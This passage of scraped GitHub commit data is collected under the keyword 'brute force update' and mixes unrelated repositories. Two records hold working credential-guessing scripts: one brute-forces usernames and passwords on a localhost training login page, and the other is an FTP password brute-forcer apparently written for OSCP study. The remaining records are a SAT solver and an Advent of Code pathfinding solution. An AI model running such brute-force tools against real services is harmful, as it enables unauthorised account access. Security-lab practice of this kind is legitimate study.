open(f\"loop{str(loop)}_pass.py\", \"w\")\n    f.writelines('import requests\\n')\n    f.writelines('characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\\n')\n    indent = \"\"\n    output = \"\"\n    for j in range(0, loop):\n      f.writelines(f\"{indent}for {characters[j]} in characters:\\n\")\n      indent += \"  \"\n      output += characters[j] + \"+\"\n    f.writelines(f\"{indent}temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={{'username': '{username}', 'password': {output[:-1]}}})\\n\")\n    f.writelines(f\"{indent}if \\\"Incorrect password\\\" not in temp.text:\\n\")\n    f.writelines(f\"{indent}  print('Possible password: '+{output[:-1]})\\n\")\n    f.writelines(f\"{indent}  exit()\")\n#    f.writelines(f\"{indent}  exit()\\n\")\n#    f.writelines(f\"{indent}print({output[:-1]})\\n\")\n    f.close()\n\n  for i in range(1, length+1):\n#    print(i)\n    print(subprocess.check_output(f\"python3 loop{str(i)}_pass.py\", shell=True).decode())\n"},"\/helper\/A07_brute_force_scripts\/user.py":{"changes":[{"diff":"\n-import subprocess\n-# import requests\n-\n-# temp = requests.post(\"http:\/\/localhost\/A07-authenticationFailure\/login.php\", data={\"username\": \"aaa\", \"password\": \"bbb\"})\n-# print(temp.text)\n-\n-characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-length = 2\n-\n-for i in range(0, length):\n-  loop = i+1\n-  f = open(f\"loop{str(loop)}_user.py\", \"w\")\n-  f.writelines('import requests\\n')\n-  f.writelines('characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\\n')\n-  indent = \"\"\n-  output = \"\"\n-  for j in range(0, loop):\n-    f.writelines(f\"{indent}for {characters[j]} in characters:\\n\")\n-    indent += \"  \"\n-    output += characters[j] + \"+\"\n-  f.writelines(f\"{indent}temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={{'username': {output[:-1]}, 'password': '123'}})\\n\")\n-  f.writelines(f\"{indent}if \\\"User doesn't exist\\\" not in temp.text:\\n\")\n-  f.writelines(f\"{indent}  print('Possible username: '+{output[:-1]})\\n\")\n-#  f.writelines(f\"{indent}  exit()\\n\")\n-#  f.writelines(f\"{indent}print({output[:-1]})\\n\")\n-  f.close()\n-\n-for i in range(1, length+1):\n-#  print(i)\n-  print(subprocess.check_output(f\"python3 loop{str(i)}_user.py\", shell=True).","add":0,"remove":30,"filename":"\/helper\/A07_brute_force_scripts\/user.py","badparts":["import subprocess","characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]","length = 2","for i in range(0, length):","  loop = i+1","  f = open(f\"loop{str(loop)}_user.py\", \"w\")","  f.writelines('import requests\\n')","  f.writelines('characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\\n')","  indent = \"\"","  output = \"\"","  for j in range(0, loop):","    f.writelines(f\"{indent}for {characters[j]} in characters:\\n\")","    indent += \"  \"","    output += characters[j] + \"+\"","  f.writelines(f\"{indent}temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={{'username': {output[:-1]}, 'password': '123'}})\\n\")","  f.writelines(f\"{indent}if \\\"User doesn't exist\\\" not in temp.text:\\n\")","  f.writelines(f\"{indent}  print('Possible username: '+{output[:-1]})\\n\")","  f.close()","for i in range(1, length+1):","  print(subprocess.check_output(f\"python3 loop{str(i)}_user.py\", shell=True)."],"goodparts":[]}],"source":"\nimport subprocess characters=[\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"] length=2 for i in range(0, length): loop=i+1 f=open(f\"loop{str(loop)}_user.py\", \"w\") f.writelines('import requests\\n') f.writelines('characters=[\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\\n') indent=\"\" output=\"\" for j in range(0, loop): f.writelines(f\"{indent}for{characters[j]} in characters:\\n\") indent +=\" \" output +=characters[j] +\"+\" f.writelines(f\"{indent}temp=requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={{'username':{output[:-1]}, 'password': '123'}})\\n\") f.writelines(f\"{indent}if \\\"User doesn't exist\\\" not in temp.text:\\n\") f.writelines(f\"{indent} print('Possible username: '+{output[:-1]})\\n\") f.close() for i in range(1, length+1): print(subprocess.check_output(f\"python3 loop{str(i)}_user.py\", shell=True).decode()) ","sourceWithComments":"import subprocess\n# import requests\n\n# temp = requests.post(\"http:\/\/localhost\/A07-authenticationFailure\/login.php\", data={\"username\": \"aaa\", \"password\": \"bbb\"})\n# print(temp.text)\n\ncharacters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\nlength = 2\n\nfor i in range(0, length):\n  loop = i+1\n  f = open(f\"loop{str(loop)}_user.py\", \"w\")\n  f.writelines('import requests\\n')\n  f.writelines('characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\\n')\n  indent = \"\"\n  output = \"\"\n  for j in range(0, loop):\n    f.writelines(f\"{indent}for {characters[j]} in characters:\\n\")\n    indent += \"  \"\n    output += characters[j] + \"+\"\n  f.writelines(f\"{indent}temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={{'username': {output[:-1]}, 'password': '123'}})\\n\")\n  f.writelines(f\"{indent}if \\\"User doesn't exist\\\" not in temp.text:\\n\")\n  f.writelines(f\"{indent}  print('Possible username: '+{output[:-1]})\\n\")\n#  f.writelines(f\"{indent}  exit()\\n\")\n#  f.writelines(f\"{indent}print({output[:-1]})\\n\")\n  f.close()\n\nfor i in range(1, length+1):\n#  print(i)\n  print(subprocess.check_output(f\"python3 loop{str(i)}_user.py\", shell=True).decode())\n"}},"msg":"update brute force script"}},"https:\/\/github.com\/DiegoPerdomo0805\/proyecto_logica_1":{"f9431be238508986e1dd9c17f9668d585979797c":{"url":"https:\/\/api.github.com\/repos\/DiegoPerdomo0805\/proyecto_logica_1\/commits\/f9431be238508986e1dd9c17f9668d585979797c","html_url":"https:\/\/github.com\/DiegoPerdomo0805\/proyecto_logica_1\/commit\/f9431be238508986e1dd9c17f9668d585979797c","message":"brute force update","sha":"f9431be238508986e1dd9c17f9668d585979797c","keyword":"brute force update","diff":"diff --git a\/bruteForce.py b\/bruteForce.py\nindex 06f8058..f522d2c 100644\n--- a\/bruteForce.py\n+++ b\/bruteForce.py\n@@ -21,35 +21,54 @@\n import itertools as it\n \n def bruteForce(clause):\n-  variables = []\n+  literales = []\n \n-  for item in clause:\n-    for var in item:\n-      if var[0] == \"!\": var = var[1]\n-      if not var in variables: variables.append(var)\n+  for clause_elements in clause:\n+    for literal in clause_elements:\n \n-  values = [True, False]\n-  allPosible = it.product(values, repeat=len(variables))\n-  allPosible = [{\n-    variable: posibility[variables.index(variable)]\n-    for variable in variables\n-  } for posibility in allPosible]\n+      #busca cada elemento que est\u00e1 negado, luego lo vuelve positivo.\n+      if \"!\" in literal: \n+        literal = literal[1]\n \n-  for i in range(len(allPosible)):\n-    posibility = allPosible[i]\n-    satisfied = True\n+      #almacena cada literal distinta (siempre positiva) en un array\n+      if not literal in literales: \n+        literales.append(literal)\n+\n+  #ccuenta cuantos literales distintos hay\n+  n = len(literales)\n+\n+  #producto cartesiano de las literales y asigna valores a las opciones.\n+  # AQUI EL FUNCIONAMIENTO DE FUERZA BRUTA: Todas las posibles opciones se declaran aqu\u00ed. \n+  options = [{variable: posibility[literales.index(variable)]\n+    for variable in literales\n+  } for posibility in (it.product([True, False], repeat=n))]\n+\n+\n+  #verifica cada opci\u00f3n posible en la clausula indicada\n+  for option in options:\n+    verify = True\n+    check = True\n \n     for disjuncion in clause:\n-      djValue = False\n+      disjuncion_Value = False\n+\n       for variable in disjuncion:\n-        inversion = True if variable[0] == \"!\" else False\n+        if variable[0] == \"!\":\n+          check = True \n+        else: \n+          check = False\n \n-        if inversion: variable = variable[1]\n-        value = posibility[variable] ^ inversion\n-        djValue = djValue or value\n-      satisfied = satisfied and djValue\n+        if check: \n+          variable = variable[1]\n+          \n+        value = option[variable] ^ check\n+        disjuncion_Value = disjuncion_Value or value\n+        \n+      #si s\u00ed es v\u00e1lido el disjunction_value, entonces se retorna true junto con las opciones que permitieron el funcionamiento correcto.\n+      verify = verify and disjuncion_Value\n+      \n+    if verify:\n+      return [True, option]\n       \n-    if satisfied:\n-      return [True, posibility]\n   return [False, None]\n \n","files":{"\/bruteForce.py":{"changes":[{"diff":"\n import itertools as it\n \n def bruteForce(clause):\n-  variables = []\n+  literales = []\n \n-  for item in clause:\n-    for var in item:\n-      if var[0] == \"!\": var = var[1]\n-      if not var in variables: variables.append(var)\n+  for clause_elements in clause:\n+    for literal in clause_elements:\n \n-  values = [True, False]\n-  allPosible = it.product(values, repeat=len(variables))\n-  allPosible = [{\n-    variable: posibility[variables.index(variable)]\n-    for variable in variables\n-  } for posibility in allPosible]\n+      #busca cada elemento que est\u00e1 negado, luego lo vuelve positivo.\n+      if \"!\" in literal: \n+        literal = literal[1]\n \n-  for i in range(len(allPosible)):\n-    posibility = allPosible[i]\n-    satisfied = True\n+      #almacena cada literal distinta (siempre positiva) en un array\n+      if not literal in literales: \n+        literales.append(literal)\n+\n+  #ccuenta cuantos literales distintos hay\n+  n = len(literales)\n+\n+  #producto cartesiano de las literales y asigna valores a las opciones.\n+  # AQUI EL FUNCIONAMIENTO DE FUERZA BRUTA: Todas las posibles opciones se declaran aqu\u00ed. \n+  options = [{variable: posibility[literales.index(variable)]\n+    for variable in literales\n+  } for posibility in (it.product([True, False], repeat=n))]\n+\n+\n+  #verifica cada opci\u00f3n posible en la clausula indicada\n+  for option in options:\n+    verify = True\n+    check = True\n \n     for disjuncion in clause:\n-      djValue = False\n+      disjuncion_Value = False\n+\n       for variable in disjuncion:\n-        inversion = True if variable[0] == \"!\" else False\n+        if variable[0] == \"!\":\n+          check = True \n+        else: \n+          check = False\n \n-        if inversion: variable = variable[1]\n-        value = posibility[variable] ^ inversion\n-        djValue = djValue or value\n-      satisfied = satisfied and djValue\n+        if check: \n+          variable = variable[1]\n+          \n+        value = option[variable] ^ check\n+        disjuncion_Value = disjuncion_Value or value\n+        \n+      #si s\u00ed es v\u00e1lido el disjunction_value, entonces se retorna true junto con las opciones que permitieron el funcionamiento correcto.\n+      verify = verify and disjuncion_Value\n+      \n+    if verify:\n+      return [True, option]\n       \n-    if satisfied:\n-      return [True, posibility]\n   return [False, None]\n \n","add":41,"remove":22,"filename":"\/bruteForce.py","badparts":["  variables = []","  for item in clause:","    for var in item:","      if var[0] == \"!\": var = var[1]","      if not var in variables: variables.append(var)","  values = [True, False]","  allPosible = it.product(values, repeat=len(variables))","  allPosible = [{","    variable: posibility[variables.index(variable)]","    for variable in variables","  } for posibility in allPosible]","  for i in range(len(allPosible)):","    posibility = allPosible[i]","    satisfied = True","      djValue = False","        inversion = True if variable[0] == \"!\" else False","        if inversion: variable = variable[1]","        value = posibility[variable] ^ inversion","        djValue = djValue or value","      satisfied = satisfied and djValue","    if satisfied:","      return [True, posibility]"],"goodparts":["  literales = []","  for clause_elements in clause:","    for literal in clause_elements:","      if \"!\" in literal: ","        literal = literal[1]","      if not literal in literales: ","        literales.append(literal)","  n = len(literales)","  options = [{variable: posibility[literales.index(variable)]","    for variable in literales","  } for posibility in (it.product([True, False], repeat=n))]","  for option in options:","    verify = True","    check = True","      disjuncion_Value = False","        if variable[0] == \"!\":","          check = True ","        else: ","          check = False","        if check: ","          variable = variable[1]","        value = option[variable] ^ check","        disjuncion_Value = disjuncion_Value or value","      verify = verify and disjuncion_Value","    if verify:","      return [True, option]"]}],"source":"\n''' ---------------------------------------- Universidad del Valle de Guatemala Logica Matematica, seccion 20 -Carol Arevale -20461 -Stefano Aragoni -20261 -Luis Santos -20226 -Jose Gonzales -20335 -Diego Perdomo -20204 -Diego Cordova -20212 bruteForce.py -Implementacion del algoritmo de fuerza bruta para SAT Last modified(yy-mm-dd): 2022-08-06 ---------------------------------------- ''' import itertools as it def bruteForce(clause): variables=[] for item in clause: for var in item: if var[0]==\"!\": var=var[1] if not var in variables: variables.append(var) values=[True, False] allPosible=it.product(values, repeat=len(variables)) allPosible=[{ variable: posibility[variables.index(variable)] for variable in variables } for posibility in allPosible] for i in range(len(allPosible)): posibility=allPosible[i] satisfied=True for disjuncion in clause: djValue=False for variable in disjuncion: inversion=True if variable[0]==\"!\" else False if inversion: variable=variable[1] value=posibility[variable] ^ inversion djValue=djValue or value satisfied=satisfied and djValue if satisfied: return[True, posibility] return[False, None] ","sourceWithComments":"''' \n----------------------------------------\n  Universidad del Valle de Guatemala\n  Logica Matematica, seccion 20\n  \n    - Carol Arevale - 20461\n    - Stefano Aragoni - 20261\n    - Luis Santos - 20226\n    - Jose Gonzales - 20335\n    - Diego Perdomo - 20204\n    - Diego Cordova - 20212\n\n  bruteForce.py\n  - Implementacion del algoritmo\n    de fuerza bruta para SAT\n  \n  Last modified (yy-mm-dd): 2022-08-06\n----------------------------------------\n'''\n\nimport itertools as it\n\ndef bruteForce(clause):\n  variables = []\n\n  for item in clause:\n    for var in item:\n      if var[0] == \"!\": var = var[1]\n      if not var in variables: variables.append(var)\n\n  values = [True, False]\n  allPosible = it.product(values, repeat=len(variables))\n  allPosible = [{\n    variable: posibility[variables.index(variable)]\n    for variable in variables\n  } for posibility in allPosible]\n\n  for i in range(len(allPosible)):\n    posibility = allPosible[i]\n    satisfied = True\n\n    for disjuncion in clause:\n      djValue = False\n      for variable in disjuncion:\n        inversion = True if variable[0] == \"!\" else False\n\n        if inversion: variable = variable[1]\n        value = posibility[variable] ^ inversion\n        djValue = djValue or value\n      satisfied = satisfied and djValue\n      \n    if satisfied:\n      return [True, posibility]\n  return [False, None]\n\n"}},"msg":"brute force update"}},"https:\/\/github.com\/reinaldoboas\/Python":{"e318224305811e5362ef895d94ffc8a0dbf54383":{"url":"https:\/\/api.github.com\/repos\/reinaldoboas\/Python\/commits\/e318224305811e5362ef895d94ffc8a0dbf54383","html_url":"https:\/\/github.com\/reinaldoboas\/Python\/commit\/e318224305811e5362ef895d94ffc8a0dbf54383","message":"Update brute_force_ftp.py","sha":"e318224305811e5362ef895d94ffc8a0dbf54383","keyword":"brute force update","diff":"diff --git a\/brute_force_ftp.py b\/brute_force_ftp.py\nindex 302a53f..8126e1a 100644\n--- a\/brute_force_ftp.py\n+++ b\/brute_force_ftp.py\n@@ -15,7 +15,7 @@\n \n f = open('C:\\\\Users\\\\User\\\\Documents\\\\MEGA\\\\OSCP\\\\DCPT\\\\For\u00e7a_Bruta\\\\wordlist.txt.txt')\n for palavra in f.readlines():\n-    print(f\"Realizando o brute force FTP: {usuario}:{palavra}\")\n+    print(f\"Realizando o brute force FTP: {usuario}:{palavra}\").strip()\n     \n     # Criando o socket TCP\n     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n","files":{"\/brute_force_ftp.py":{"changes":[{"diff":"\n \n f = open('C:\\\\Users\\\\User\\\\Documents\\\\MEGA\\\\OSCP\\\\DCPT\\\\For\u00e7a_Bruta\\\\wordlist.txt.txt')\n for palavra in f.readlines():\n-    print(f\"Realizando o brute force FTP: {usuario}:{palavra}\")\n+    print(f\"Realizando o brute force FTP: {usuario}:{palavra}\").strip()\n     \n     # Criando o socket TCP\n     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n","add":1,"remove":1,"filename":"\/brute_force_ftp.py","badparts":["    print(f\"Realizando o brute force FTP: {usuario}:{palavra}\")"],"goodparts":["    print(f\"Realizando o brute force FTP: {usuario}:{palavra}\").strip()"]}],"source":"\n from ast import Bytes import socket,sys,re if len(sys.argv) !=3: print(\"Modo de uso: python kingftp.py 127.0.0.1 usuario\") sys.exit() target=sys.argv[1] usuario=sys.argv[2] f=open('C:\\\\Users\\\\User\\\\Documents\\\\MEGA\\\\OSCP\\\\DCPT\\\\For\u00e7a_Bruta\\\\wordlist.txt.txt') for palavra in f.readlines(): print(f\"Realizando o brute force FTP:{usuario}:{palavra}\") s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,21)) s.recv(1024) encoded=Bytes(usuario.encode()) mensagem_usuario=f\"USER ftp.{target}|{usuario}\\r\\n\".encode() s.send(mensagem_usuario) s.recv(1024) mensagem_senha=f\"PASS{palavra}\\r\\n\".encode() s.send(mensagem_senha) resposta=s.recv(1024).decode() mensagem_saida=f\"QUIT\\r\\n\".encode() s.send(mensagem_saida) if re.search('230', resposta): print(f\"Senha encontrada -->{palavra}\") break ","sourceWithComments":"# brute_force_ftp.py\n# Data: 18\/08\/2022\n# Criador: Reinaldo Garcia\n# Descri\u00e7\u00e3o: Script para fazer Brute Force no servi\u00e7o de FTP\n\nfrom ast import Bytes\nimport socket,sys,re\n\nif len(sys.argv) != 3:\n    print(\"Modo de uso: python kingftp.py 127.0.0.1 usuario\")\n    sys.exit()\n\ntarget = sys.argv[1]\nusuario = sys.argv[2]\n\nf = open('C:\\\\Users\\\\User\\\\Documents\\\\MEGA\\\\OSCP\\\\DCPT\\\\For\u00e7a_Bruta\\\\wordlist.txt.txt')\nfor palavra in f.readlines():\n    print(f\"Realizando o brute force FTP: {usuario}:{palavra}\")\n    \n    # Criando o socket TCP\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target,21))\n    s.recv(1024)\n\n    encoded = Bytes(usuario.encode())\n    mensagem_usuario = f\"USER ftp.{target}|{usuario}\\r\\n\".encode()\n    s.send(mensagem_usuario)\n    s.recv(1024)\n    mensagem_senha = f\"PASS {palavra}\\r\\n\".encode()\n    s.send(mensagem_senha)\n    resposta = s.recv(1024).decode()\n    mensagem_saida = f\"QUIT\\r\\n\".encode()\n    s.send(mensagem_saida)\n\n    if re.search('230', resposta):\n        print(f\"Senha encontrada --> {palavra}\")\n        break\n"}},"msg":"Update brute_force_ftp.py"}},"https:\/\/github.com\/MichaelSquires\/AdventOfCode":{"8c74305f7f0baf5b440fe5d2b1b376ec5486e343":{"url":"https:\/\/api.github.com\/repos\/MichaelSquires\/AdventOfCode\/commits\/8c74305f7f0baf5b440fe5d2b1b376ec5486e343","html_url":"https:\/\/github.com\/MichaelSquires\/AdventOfCode\/commit\/8c74305f7f0baf5b440fe5d2b1b376ec5486e343","message":"Day 12 update\n\n- Search backward for value instead of brute forcing dijkstra forward","sha":"8c74305f7f0baf5b440fe5d2b1b376ec5486e343","keyword":"brute force update","diff":"diff --git a\/2022\/d12.py b\/2022\/d12.py\nindex 332636a..d91d038 100644\n--- a\/2022\/d12.py\n+++ b\/2022\/d12.py\n@@ -1,6 +1,5 @@\n import queue\n import string\n-import logging\n import collections\n \n import utils\n@@ -14,19 +13,22 @@\n abdefghi\n '''\n \n-INDICES = 'S' + string.ascii_lowercase + 'E'\n-START = INDICES.index('S')\n-END = INDICES.index('E')\n+VALUES = 'S' + string.ascii_lowercase + 'E'\n+START = VALUES.index('S')\n+END = VALUES.index('E')\n \n INFINITY = 2**32\n \n class Grid(utils.Grid):\n     def dijkstra(self, source, target):\n-        return pyrust.y22d12(self, source, target)\n+        return pyrust.y22d12(self, source, target)  # pylint: disable=no-member\n \n-    def pydijkstra(self, source, target):\n+    def dijkstra_find(self, source, target_val):\n         '''\n-        https:\/\/en.wikipedia.org\/wiki\/Dijkstra%27s_algorithm\n+        Dijkstra search for target_val of cell instead of coordinates\n+\n+        NOTE: This is a non-standard dijkstra algorithm. Do not copy this to\n+        future days\n         '''\n         Q = queue.PriorityQueue()\n \n@@ -37,15 +39,23 @@ def pydijkstra(self, source, target):\n \n         Q.put((0, source))\n \n+        target = None\n+\n         while not Q.empty():\n             _, u = Q.get()\n \n             here = self[u]\n \n+            # Break if we find a coord that has the target value\n+            if here == target_val:\n+                target = u\n+                break\n+\n             for v in self.adjacent(*u):\n-                # NOTE: This is non-standard for dijkstra. Do not copy this to\n-                # future days\n-                if self[v] > here + 1:\n+                # For this challenge, we can't step up more than one at a time.\n+                # Since we're searching backward, that means we can't step down\n+                # more than one at a time.\n+                if self[v] < here - 1:\n                     continue\n \n                 alt = dist[u] + self[v]\n@@ -62,38 +72,22 @@ def pydijkstra(self, source, target):\n \n         return S\n \n-def parse(data: str):\n-    values = []\n-\n-    for line in data.splitlines():\n-        values.append([INDICES.index(k) for k in line])\n-\n-    return Grid.init_with_data(values)\n \n+def parse(data: str):\n+    data = [list(map(VALUES.index, k)) for k in data.splitlines()]\n+    return Grid.init_with_data(data)\n \n def part1(grid: Grid):\n     start = grid.find(START)\n     end = grid.find(END)\n     \n     path = grid.dijkstra(start, end)\n+    # Path includes the source coordinates so sub 1\n     return len(path) - 1\n \n def part2(grid: Grid):\n-    start = grid.find(START)\n     end = grid.find(END)\n \n-    grid[start] = INDICES.index('a')\n-\n-    best = INFINITY\n-    \n-    for xy in grid.findall(INDICES.index('a')):\n-        path = grid.dijkstra(xy, end)\n-\n-        attempt = len(path) - 1\n-        if attempt <= 0:\n-            continue\n-\n-        if attempt < best and attempt != 0:\n-            best = attempt\n-\n-    return best\n+    path = grid.dijkstra_find(end, VALUES.index('a'))\n+    # Path includes the source coordinates so sub 1\n+    return len(path) - 1\n","files":{"\/2022\/d12.py":{"changes":[{"diff":"\n import queue\n import string\n-import logging\n import collections\n \n import utils\n","add":0,"remove":1,"filename":"\/2022\/d12.py","badparts":["import logging"],"goodparts":[]},{"diff":"\n '''\n \n-INDICES = 'S' + string.ascii_lowercase + 'E'\n-START = INDICES.index('S')\n-END = INDICES.index('E')\n+VALUES = 'S' + string.ascii_lowercase + 'E'\n+START = VALUES.index('S')\n+END = VALUES.index('E')\n \n INFINITY = 2**32\n \n class Grid(utils.Grid):\n     def dijkstra(self, source, target):\n-        return pyrust.y22d12(self, source, target)\n+        return pyrust.y22d12(self, source, target)  # pylint: disable=no-member\n \n-    def pydijkstra(self, source, target):\n+    def dijkstra_find(self, source, target_val):\n         '''\n-        https:\/\/en.wikipedia.org\/wiki\/Dijkstra%27s_algorithm\n+        Dijkstra search for target_val of cell instead of coordinates\n+\n+        NOTE: This is a non-standard dijkstra algorithm. Do not copy this to\n+        future days\n         '''\n         Q = queue.PriorityQueue()\n \n","add":9,"remove":6,"filename":"\/2022\/d12.py","badparts":["INDICES = 'S' + string.ascii_lowercase + 'E'","START = INDICES.index('S')","END = INDICES.index('E')","        return pyrust.y22d12(self, source, target)","    def pydijkstra(self, source, target):","        https:\/\/en.wikipedia.org\/wiki\/Dijkstra%27s_algorithm"],"goodparts":["VALUES = 'S' + string.ascii_lowercase + 'E'","START = VALUES.index('S')","END = VALUES.index('E')","        return pyrust.y22d12(self, source, target)  # pylint: disable=no-member","    def dijkstra_find(self, source, target_val):","        Dijkstra search for target_val of cell instead of coordinates","        NOTE: This is a non-standard dijkstra algorithm. Do not copy this to","        future days"]},{"diff":"\n \n         Q.put((0, source))\n \n+        target = None\n+\n         while not Q.empty():\n             _, u = Q.get()\n \n             here = self[u]\n \n+            # Break if we find a coord that has the target value\n+            if here == target_val:\n+                target = u\n+                break\n+\n             for v in self.adjacent(*u):\n-                # NOTE: This is non-standard for dijkstra. Do not copy this to\n-                # future days\n-                if self[v] > here + 1:\n+                # For this challenge, we can't step up more than one at a time.\n+                # Since we're searching backward, that means we can't step down\n+                # more than one at a time.\n+                if self[v] < here - 1:\n                     continue\n \n                 alt = dist[u] + self[v]\n","add":11,"remove":3,"filename":"\/2022\/d12.py","badparts":["                if self[v] > here + 1:"],"goodparts":["        target = None","            if here == target_val:","                target = u","                break","                if self[v] < here - 1:"]},{"diff":"\n \n         return S\n \n-def parse(data: str):\n-    values = []\n-\n-    for line in data.splitlines():\n-        values.append([INDICES.index(k) for k in line])\n-\n-    return Grid.init_with_data(values)\n \n+def parse(data: str):\n+    data = [list(map(VALUES.index, k)) for k in data.splitlines()]\n+    return Grid.init_with_data(data)\n \n def part1(grid: Grid):\n     start = grid.find(START)\n     end = grid.find(END)\n     \n     path = grid.dijkstra(start, end)\n+    # Path includes the source coordinates so sub 1\n     return len(path) - 1\n \n def part2(grid: Grid):\n-    start = grid.find(START)\n     end = grid.find(END)\n \n-    grid[start] = INDICES.index('a')\n-\n-    best = INFINITY\n-    \n-    for xy in grid.findall(INDICES.index('a')):\n-        path = grid.dijkstra(xy, end)\n-\n-        attempt = len(path) - 1\n-        if attempt <= 0:\n-            continue\n-\n-        if attempt < best and attempt != 0:\n-            best = attempt\n-\n-    return best\n+    path = grid.dijkstra_find(end, VALUES.index('a'))\n+    # Path includes the source coordinates so sub 1\n+    return len(path) - 1\n","add":7,"remove":23,"filename":"\/2022\/d12.py","badparts":["def parse(data: str):","    values = []","    for line in data.splitlines():","        values.append([INDICES.index(k) for k in line])","    return Grid.init_with_data(values)","    start = grid.find(START)","    grid[start] = INDICES.index('a')","    best = INFINITY","    for xy in grid.findall(INDICES.index('a')):","        path = grid.dijkstra(xy, end)","        attempt = len(path) - 1","        if attempt <= 0:","            continue","        if attempt < best and attempt != 0:","            best = attempt","    return best"],"goodparts":["def parse(data: str):","    data = [list(map(VALUES.index, k)) for k in data.splitlines()]","    return Grid.init_with_data(data)","    path = grid.dijkstra_find(end, VALUES.index('a'))","    return len(path) - 1"]}],"source":"\nimport queue import string import logging import collections import utils import pyrust SAMPLE='''\\ Sabqponm abcryxxl accszExk acctuvwj abdefghi ''' INDICES='S' +string.ascii_lowercase +'E' START=INDICES.index('S') END=INDICES.index('E') INFINITY=2**32 class Grid(utils.Grid): def dijkstra(self, source, target): return pyrust.y22d12(self, source, target) def pydijkstra(self, source, target): ''' https:\/\/en.wikipedia.org\/wiki\/Dijkstra%27s_algorithm ''' Q=queue.PriorityQueue() dist=collections.defaultdict(lambda: INFINITY) dist[source]=0 prev=collections.defaultdict(lambda: None) Q.put((0, source)) while not Q.empty(): _, u=Q.get() here=self[u] for v in self.adjacent(*u): if self[v] > here +1: continue alt=dist[u] +self[v] if alt < dist[v]: dist[v]=alt prev[v]=u Q.put((alt, v)) S=[] u=target while u is not None: S.insert(0, u) u=prev[u] return S def parse(data: str): values=[] for line in data.splitlines(): values.append([INDICES.index(k) for k in line]) return Grid.init_with_data(values) def part1(grid: Grid): start=grid.find(START) end=grid.find(END) path=grid.dijkstra(start, end) return len(path) -1 def part2(grid: Grid): start=grid.find(START) end=grid.find(END) grid[start]=INDICES.index('a') best=INFINITY for xy in grid.findall(INDICES.index('a')): path=grid.dijkstra(xy, end) attempt=len(path) -1 if attempt <=0: continue if attempt < best and attempt !=0: best=attempt return best ","sourceWithComments":"import queue\nimport string\nimport logging\nimport collections\n\nimport utils\nimport pyrust\n\nSAMPLE = '''\\\nSabqponm\nabcryxxl\naccszExk\nacctuvwj\nabdefghi\n'''\n\nINDICES = 'S' + string.ascii_lowercase + 'E'\nSTART = INDICES.index('S')\nEND = INDICES.index('E')\n\nINFINITY = 2**32\n\nclass Grid(utils.Grid):\n    def dijkstra(self, source, target):\n        return pyrust.y22d12(self, source, target)\n\n    def pydijkstra(self, source, target):\n        '''\n        https:\/\/en.wikipedia.org\/wiki\/Dijkstra%27s_algorithm\n        '''\n        Q = queue.PriorityQueue()\n\n        dist = collections.defaultdict(lambda: INFINITY)\n        dist[source] = 0\n\n        prev = collections.defaultdict(lambda: None)\n\n        Q.put((0, source))\n\n        while not Q.empty():\n            _, u = Q.get()\n\n            here = self[u]\n\n            for v in self.adjacent(*u):\n                # NOTE: This is non-standard for dijkstra. Do not copy this to\n                # future days\n                if self[v] > here + 1:\n                    continue\n\n                alt = dist[u] + 